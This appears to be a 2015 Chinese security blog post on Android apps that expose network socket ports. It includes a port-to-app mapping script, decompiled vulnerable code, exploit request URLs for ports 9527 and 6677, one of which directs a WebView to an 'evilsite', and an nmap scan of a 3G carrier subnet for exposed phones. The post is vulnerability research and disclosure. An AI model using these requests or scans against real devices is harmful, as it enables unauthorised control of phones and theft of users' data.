<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>浅谈Android开放网络端口的安全风险 | MS509 Team</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/7.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">浅谈Android开放网络端口的安全风险</h1><a id="logo" href="/.">MS509 Team</a><p class="description">Mission Studio</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">浅谈Android开放网络端口的安全风险</h1><div class="post-meta">Jul 12, 2015<span> | </span><span class="category"><a href="/categories/移动安全/">移动安全</a></span></div><div class="post-content"><h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>Android应用通常使用PF_UNIX、PF_INET、PF_NETLINK等不同domain的socket来进行本地IPC或者远程网络通信，这些暴露的socket代表了潜在的本地或远程攻击面，历史上也出现过不少利用socket进行拒绝服务、root提权或者远程命令执行的案例。特别是PF_INET类型的网络socket，可以通过网络与Android应用通信，其原本用于linux环境下开放网络服务，由于缺乏对网络调用者身份或者本地调用者pid、permission等细粒度的安全检查机制，在实现不当的情况下，可以突破Android的沙箱限制，以被攻击应用的权限执行命令，通常出现比较严重的漏洞。作为Android安全研究的新手，笔者带着传统服务器渗透寻找开放socket端口的思路，竟然也刷了不少漏洞，下面就对这种漏洞的发现、案例及影响进行归纳。</p>
<h3 id="0x01-Android开放端口应用定位"><a href="#0x01-Android开放端口应用定位" class="headerlink" title="0x01 Android开放端口应用定位"></a>0x01 Android开放端口应用定位</h3><p>简单地利用命令netstat就可以发现Android开放了许多socket端口，如图。但这些开放端口本后的应用却不得而知。</p>
<p><img src="/2015/07/12/android-open-port/allports.png" alt="image"></p>
<p>此时可以通过三步定位法进行寻找（感谢@瘦蛟舞的<a href="android-open-port/http://zone.wooyun.org/content/20410">帖子</a>），支持非root手机。</p>
<p>第一步，利用netstat寻找感兴趣的开放socket端口，如图中的15555。</p>
<p>第二步，将端口转换为十六进制值，查看位于/proc/net/目录下对应的socket套接字状态文件，在其中找到使用该socket的应用的uid。如15555的十六进制表示为1cc3，协议类型为tcp6，那么查看/proc/net/tcp6文件。</p>
<p><img src="/2015/07/12/android-open-port/findport2.png" alt="image"><br>注意上面的10115，就是使用该socket的应用的uid。通过这个uid可以得知应用的用户名为u0_a115。</p>
<p>第三步，根据用户名就可以找到应用了<br><img src="/2015/07/12/android-open-port/findport3.png" alt="image"><br>至此，我们就知道开放15555端口的应用为com.qiyi.video，尽管我们还不能分辨出开放该端口的准确进程，但仍然为进一步的漏洞挖掘打下基础。</p>
<p>写一个简单的脚本来自动化的完成此项工作.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line">import subprocess,re </div><div class="line"></div><div class="line">def toHexPort(port):</div><div class="line">    hexport = str(hex(int(port)))</div><div class="line">    return hexport.strip(&apos;0x&apos;).upper()</div><div class="line"></div><div class="line">def finduid(protocol, entry):</div><div class="line">    if (protocol==&apos;tcp&apos; or protocol==&apos;tcp6&apos;):</div><div class="line">        uid = entry.split()[-10]</div><div class="line">    else: # udp or udp6</div><div class="line">        uid = entry.split()[-6]</div><div class="line">    uid = int(uid)</div><div class="line">    if (uid &gt; 10000): # just for non-system app</div><div class="line">        return &apos;u0_a&apos;+str(uid-10000) </div><div class="line">    else:</div><div class="line">        return -1</div><div class="line"></div><div class="line">def main():</div><div class="line">    netstat_cmd = &quot;adb shell netstat | grep -Ei &apos;listen|udp*&apos;&quot;</div><div class="line">    #netstat_cmd = &quot;adb shell netstat &quot;</div><div class="line">    grep_cmd = &quot;adb shell grep&quot; </div><div class="line">    proc_net = &quot;/proc/net/&quot;</div><div class="line">    </div><div class="line"># step 1, find interesting port</div><div class="line">    orig_output = subprocess.check_output(netstat_cmd, shell=True)</div><div class="line">    list_line = orig_output.split(&apos;\r\n&apos;)</div><div class="line">    </div><div class="line">    apps = []</div><div class="line">    strip_listline = []</div><div class="line">    pattern = re.compile(&quot;^Proto&quot;) # omit the first line</div><div class="line">    </div><div class="line">    for line in list_line:</div><div class="line">        if (line != &apos;&apos;) and (pattern.match(line)==None):</div><div class="line">        </div><div class="line"># step 2, find uid in /proc/net/[protocol] based on port </div><div class="line">            socket_entry = line.split()</div><div class="line">            protocol = socket_entry[0]  </div><div class="line">            port = socket_entry[3].split(&apos;:&apos;)[-1]</div><div class="line">            grep_appid = grep_cmd+&apos; &apos;+ toHexPort(port)+&apos; &apos;+proc_net + protocol </div><div class="line">            net_entry = subprocess.check_output(grep_appid, shell=True)</div><div class="line">            uid = finduid(protocol, net_entry)</div><div class="line"># step 3, find app username based on uid</div><div class="line">            if (uid == -1): continue</div><div class="line">            applist = subprocess.check_output(&apos;adb shell ps | grep &apos;+uid, shell=True).split()</div><div class="line">            app = applist[8]</div><div class="line">            apps.append(app)</div><div class="line">            strip_listline.append(line)</div><div class="line">            </div><div class="line">    itapp= iter(apps)</div><div class="line">    itline=iter(strip_listline)</div><div class="line"># last, add app in orig_output of sockets</div><div class="line">    print (&quot;Package                  Proto Recv-Q Send-Q         Local Address          Foreign Address        State\r\n&quot;)</div><div class="line">    try:</div><div class="line">        while True:</div><div class="line">            print itapp.next()+&apos; &apos;+itline.next()</div><div class="line">    except StopIteration:</div><div class="line">        pass</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<p>运行结果如下<br><img src="/2015/07/12/android-open-port/result.png" alt="image"></p>
<p>除了PF_INET套接字外，PF_UNIX、PF_NETLINK套接字的状态文件分别位于/proc/net/unix和/proc/net/netlink。</p>
<p>当然，如果手机已root，可直接使用busybox安装目录下带p参数的netstat命令，可以显示pid和不完整的program name。<br><img src="/2015/07/12/android-open-port/rootresult.png" alt="image"></p>
<h3 id="0x02-漏洞挖掘实例"><a href="#0x02-漏洞挖掘实例" class="headerlink" title="0x02 漏洞挖掘实例"></a>0x02 漏洞挖掘实例</h3><p>得知某个应用开放某个端口以后，接下就可以在该应用的逆向代码中搜索端口号（通常是端口号的16进制表示），重点关注ServerSocket(tcp)、DatagramSocket(udp)等类，定位到关键代码，进一步探索潜在的攻击面，下面列举一些漏洞实例。</p>
<h4 id="敏感信息泄露、控制手机"><a href="#敏感信息泄露、控制手机" class="headerlink" title="敏感信息泄露、控制手机"></a>敏感信息泄露、控制手机</h4><p><a href="android-open-port/http://www.wooyun.org/bugs/wooyun-2010-094537">WooYun-2015-94537</a>：某service打开udp的65502端口监听，接收特定的命令字后可返回手机的敏感信息，包括手机助手远程管理手机的SecretKey，进而未授权的攻击者可通过网络完全管理手机。</p>
<p><a href="android-open-port/http://www.securityfocus.com/archive/1/534643">CVE-2014-8757</a>, LG On-Screen Phone预装App认证绕过漏洞。</p>
<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>这类漏洞比较常见，通常通过开放socket端口传入启动android应用组件的intent，然后以被攻击应用的权限执行启动activity、发送广播等操作。由于通过socket传入的intent，无法对发送者的身份和权限进行细粒度检查，绕过了Android提供的对应用组件的权限保护，能够启动未导出的和受权限保护的应用组件，对安全造成影响。</p>
<p>如果监听的端口是在本地，那么可能造成本地命令执行和权限提升，而如果监听的端口是任意地址，则可能造成比较严重的远程命令执行。</p>
<p>本地命令执行：</p>
<p>用前面端口应用定位的方法，发现某流行应用实现了一个小型的HTTP Server，监听本地的9527端口，简单搜索分析即可发现向该端口发送如下形式的HTTP请求时可执行命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:9527/si?cmp=&lt;pacakgename&gt;_&lt;componentname&gt;&amp;data=&lt;url scheme&gt;&amp;act=&lt;action name&gt;</div></pre></td></tr></table></figure>
<p>通过这个简单的HTTP请求，恶意程序就可以传入intent对象的包名、组件名、url和action，接收HTTP请求后执行命令的代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">        if(v3.hasNext()) &#123;</div><div class="line">            Object v6 = v3.next();</div><div class="line">            if(&quot;act&quot;.equals(v6)) &#123;</div><div class="line">                v4.setAction(v10.b.get(v6));</div><div class="line">            &#125;</div><div class="line">            if(&quot;cmp&quot;.equals(v6)) &#123;</div><div class="line">                String[] v9 = v10.b.get(v6).split(&quot;_&quot;);</div><div class="line">                if(v9 == null) &#123;</div><div class="line">                    goto label_39;</div><div class="line">                &#125;</div><div class="line">                if(v9.length != 2) &#123;</div><div class="line">                    goto label_39;</div><div class="line">                &#125;</div><div class="line">                v4.setComponent(new ComponentName(v9[0], v9[1]));</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        label_39:</div><div class="line"></div><div class="line">            if(&quot;data&quot;.equals(v6)) &#123;</div><div class="line">                v4.setData(Uri.parse(v10.b.get(v6)));</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            if(!&quot;callback&quot;.equals(v6)) &#123;</div><div class="line">                goto label_13;</div><div class="line">            &#125;</div><div class="line">            Object v1_1 = v10.b.get(v6);</div><div class="line">            goto label_13;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if((TextUtils.isEmpty(v4.getAction())) &amp;&amp; v4.getComponent() == null &amp;&amp; v4.getData() == null) &#123;</div><div class="line"></div><div class="line">            if(TextUtils.isEmpty(((CharSequence)v1))) &#123;</div><div class="line">                return &quot;&#123;\&quot;result\&quot;:-20000&#125;&quot;;</div><div class="line">            &#125;</div><div class="line">            return this.a(v1, &quot;&#123;\&quot;result\&quot;:-20000&#125;&quot;);</div><div class="line">        &#125;</div><div class="line">        List v0 = this.a.getPackageManager().queryIntentActivities(v4, 0);</div><div class="line">        if(v0.size() == 0) &#123;</div><div class="line">            if(TextUtils.isEmpty(((CharSequence)v1))) &#123;</div><div class="line">                return &quot;&#123;\&quot;result\&quot;:-10000&#125;&quot;;</div><div class="line">            &#125;</div><div class="line">            return this.a(v1, &quot;&#123;\&quot;result\&quot;:-10000&#125;&quot;);</div><div class="line">        &#125;</div><div class="line">        try &#123;</div><div class="line">            this.a.startActivity(v4);</div><div class="line">        &#125;</div><div class="line">...</div></pre></td></tr></table></figure>
<p>最终通过HTTP请求设置的Intent对象，传入了startActivity方法，由于需要用户干预，危害并不大。但当packagename指定为该应用自身，componentname指定为该应用的activity时，可以启动该应用的任意activity，包括受保护的未导出activity，从而对安全造成影响。例如，通过HTTP请求，逐一启动若干未导出的activity，可以发现拒绝服务漏洞、对安全有影响的登录界面和有一个可以该应用权限执行任意命令的GUI shell。</p>
<p>远程命令执行：</p>
<ol>
<li><p>趋势科技曾经发现过美团客户端漏洞，可以通过TCP的9527端口传入intent data，进而启动activity，见参考文献[1].</p>
</li>
<li><p>远程强制webview访问恶意链接</p>
</li>
</ol>
<p>定位到某流行应用实现了一个小型的HTTP Server，在tcp的6677端口监听任意地址，当HTTP请求满足一定条件时可以返回敏感信息，并根据请求消息执行一系列动作。对于该HTTP请求，仅有的防御措施是通过referer白名单的方式判断HTTP请求的来源。在正确设置referer，发送如下HTTP GET请求后</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ip:6677/command?param1=value1&amp;...&amp;paramn=valuen</div></pre></td></tr></table></figure>
<p>可获取手机的敏感信息和实现命令执行。其中command为getpackageinfo、androidamap、geolocation中的其一，见如下代码片段。<br><img src="/2015/07/12/android-open-port/command.png" alt="image"></p>
<p>（1）当command为geolocation时，可返回安装该应用手机地理位置信息；</p>
<p>（2）当command为getpackageinfo时，默认返回该应用自身的版本信息。此时若指定参数param1为packagename,即请求<a href="http://ip:6677/getpackageinfo?packagename=xxx时（xxx为软件包名）可返回手机上安装的xxx所指定的任意软件包版本信息。若xxx为android，可返回android系统版本信息；" target="_blank" rel="external">http://ip:6677/getpackageinfo?packagename=xxx时（xxx为软件包名）可返回手机上安装的xxx所指定的任意软件包版本信息。若xxx为android，可返回android系统版本信息；</a></p>
<p>（3）当command为androidamap时，设置Intent并将其广播出去，查看对应的OnReceive方法<br><img src="/2015/07/12/android-open-port/onreceive.png" alt="image"><br>发现需要指定参数param1为action,即请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ip:6677/androidamap?action=yyy&amp;param2=value2&amp;...&amp;paramn=valuen</div></pre></td></tr></table></figure>
<p>时，OnReceive方法取出前面广播intent对象的extra，新建一个intent对象，设置intent uri为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">androidamap://yyy?sourceApplication=web&amp;param2=value2&amp;...&amp;paramn=valuen</div></pre></td></tr></table></figure>
<p>，并以隐式intent的形式启动注册这种uri scheme的activiy。</p>
<p>进一步搜索发现如下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Uri v0_2 = Uri.parse(&quot;androidamap://openFeature?featureName=OpenURL&amp;sourceApplication=banner&amp;urlType=0&amp;contentType=autonavi&amp;url=&quot;</div><div class="line">                             + this.a.m.privilegeLink);</div><div class="line">	Intent v1 = new Intent(MovieDetailHeaderView.c(this.a).getApplicationContext(), </div><div class="line">                            NewMapActivity.class);</div><div class="line">	v1.setData(v0_2);</div><div class="line">	v1.setFlags(268435456);</div><div class="line">	MovieDetailHeaderView.c(this.a).startActivity(v1);</div></pre></td></tr></table></figure>
<p>表明可以通过远程HTTP GET请求如下地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ip:6677/androidamap?action=openFeature&amp;featureName=OpenURL&amp;sourceApplication=banner&amp;urlType=0&amp;contentType=autonavi&amp;url=evilsite</div></pre></td></tr></table></figure>
<p>操纵安装该app的手机继承WebView的Activity访问evilsite，而且这里存在WebView的漏洞，利用方式包括</p>
<p>(1). 窃取私有目录下的敏感文件：远程攻击者或者本地恶意app可以令WebView加载file://域的恶意脚本文件，按照恶意脚本的请求，窃取该应用私有目录下的敏感文件，突破android沙箱限制；</p>
<p>(2). WebView远程命令执行：存在可被网页中js操纵的接口jsinterface。由于该流行应用针对的SDK版本较低（android:minSdkVersion=”8”），在Android 4.4.2以下的手机，均可使用该接口，通过js注入该应用进程执行命令。 </p>
<h3 id="0x03-漏洞利用场景"><a href="#0x03-漏洞利用场景" class="headerlink" title="0x03 漏洞利用场景"></a>0x03 漏洞利用场景</h3><p>对于Android app开放socket端口漏洞的远程利用场景，一般认为Android客户端都在内网，其利用主要还是在非安全的公共WiFi环境，通过对漏洞特征扫描即可利用。但在传统认为安全的移动互联网环境，笔者发现仍然可以扫描到其他开放端口的终端，因此也可以利用这种漏洞。</p>
<p>叙述之前，我们先对典型的移动通信网络架构进行简单的科普，一般教科书上的3G网络架构（WCDMA）如图。<br><img src="/2015/07/12/android-open-port/4g-network.jpg" alt="image"></p>
<p>包括以下组成部分：</p>
<ol>
<li><p>UE: 用户终端设备，就是手机，为用户提供电路域和分组域内的各种业务功能。</p>
</li>
<li><p>UTRAN: 陆地无线接入网，分为基站（Node B）和无线网络控制器（RNC）两部分。</p>
</li>
<li><p>CN: 核心网络，负责与其他网络的连接和对UE 的通信和管理。主要功能实体包括：</p>
<p> (1) MSC/VLR：提供CS(电路交换)域的呼叫控制、移动性管理、鉴权和加密等功能；</p>
<p> (2) GMSC：网关移动交换中心，充当移动网和固定网之间的移动关口局，承担路由分析、网间接续、网间结算等重要功能；</p>
<p> (3) SGSN：GPRS服务支持节点，提供PS（分组交换）域的路由转发、移动性管理、会话管理、鉴权和加密等功能；</p>
<p> (4) GGSN：网关GPRS支持节点，提供数据包在WCDMA 移动网和外部数据网之间的路由和封装，GGSN就好象是可寻址WCDMA移动网络中所有用户IP 的路由器，需要同外部网络交换路由信息。</p>
<p> (5) HLR：归属位置寄存器，提供用户的签约信息存放、新业务支持、增强的鉴权等功能。</p>
</li>
<li><p>External Networks：外部网络，包括ISDN和PSTN等电路交换网络，以及Internet等分组交换网络。</p>
</li>
</ol>
<p>简而言之，移动通信网络无非是大型的“局域网“，它们通过网关路由器（SGSN和GGSN）连上了Internet，进入到了互联网的世界。但是在某些移动通信网络的内部，不同的UE是可以互访的。以前面某应用开放6677端口为例，我们可以做一个简单的实验进行证明。</p>
<p>使用联通3G网络，查看当前IP地址。<br><img src="/2015/07/12/android-open-port/3gnetaddr.png" alt="image"></p>
<p>在相邻C段进行扫描，扫描到开放端口的手机<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sT --open -p6677 10.160.112.0/24</div></pre></td></tr></table></figure></p>
<p>发现如下结果<br><img src="/2015/07/12/android-open-port/scan3g.png" alt="image"></p>
<p>这证明在移动网络中，不同的UE可以互访。因此如果开放上述socket端口的app存在漏洞，在移动网络中也是可以利用的。 </p>
<h3 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h3><p>对于客户端的远程漏洞利用，从攻击者的角度来看，通常更容易使用被动的方法，即通过欺骗、劫持或社工的方法来让客户端访问我的攻击载荷。然而，从笔者发现的漏洞案例来看，许多Android应用不正确地使用网络socket端口传入命令进行跨进程通信，而且对于本地应用环境，网络socket也先天缺乏细粒度的认证授权机制，因此把Android客户端当做服务器，使用“攻”的方法，主动向开放端口发送攻击载荷也是可行的。这种漏洞一旦存在，轻则本地提权，重则为远程利用的高危漏洞，3G移动网络允许UE互访更是加剧了这种风险。</p>
<p>此外，除PF_INET外，PF_UNIX、PF_NETLINK域的套接字也是值得关注的本地攻击面。</p>
<p>[1] <a href="http://blog.trendmicro.com/trendlabs-security-intelligence/open-socket-poses-risks-to-android-security-model" target="_blank" rel="external">http://blog.trendmicro.com/trendlabs-security-intelligence/open-socket-poses-risks-to-android-security-model</a></p>
</div><div class="tags"><a href="/tags/android/">android</a></div><div class="post-nav"><a href="/2015/10/24/Drozer-modules/" class="pre">实战Drozer模块编写</a><a href="/2015/05/25/cve-2014-7911/" class="next">CVE-2014-7911安卓序列化漏洞分析</a></div></div></div></div><div class="pure-u-1 pure-u-md-1-4"><div id="sidebar"><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/IOS/">IOS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/">WEB</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/安全工具/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/渗透测试/">渗透测试</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web安全/">Web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/">二进制</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/原创漏洞/">原创漏洞</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/原创漏洞/">原创漏洞</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/原创漏洞/安卓/">安卓</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全工具/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安卓/">安卓</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/未分类/">未分类</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/移动安全/">移动安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/移动安全/二进制安全/">二进制安全</a></li></ul></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/android/" style="font-size: 15px;">android</a> <a href="/tags/android-drozer/" style="font-size: 15px;">android drozer</a> <a href="/tags/cknife/" style="font-size: 15px;">cknife</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/08/04/github-infoleak/">Github信息泄露升级版案例</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/14/Moto-bootloader-exploit/">CVE-2016-10277在MOTO X手机上的漏洞利用实践</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/28/Bluetooth-Vul-3/">蓝牙App漏洞系列分析之三</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/14/name-spoof/">“同形异义字”钓鱼攻击，钉钉中招</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/12/Bluetooth-Vul-2/">蓝牙App漏洞系列分析之二</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/06/bypass360-analysis/">分享一种可关闭大多数杀软的技术（对360安全卫士已验证成功）</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/14/wannacry/">首发 | Wannacry勒索软件母体主程序逆向分析（含临时解决方案自动化工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/04/Bluetoooth_Vul_1/">蓝牙App漏洞系列分析之一</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/21/android-telephony-dos/">Android Telephony拒绝服务漏洞（CVE-2016-6763）分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/08/details-telephodos/">Details of Denial of service vulnerability in Telephony  [CVE-2016-6763]</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.example1.com/" title="site-name1" target="_blank">site-name1</a><ul></ul><a href="http://www.zerokeeper.com/" title="小李飞刀" target="_blank">小李飞刀</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2017 <a href="/." rel="nofollow">MS509 Team.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>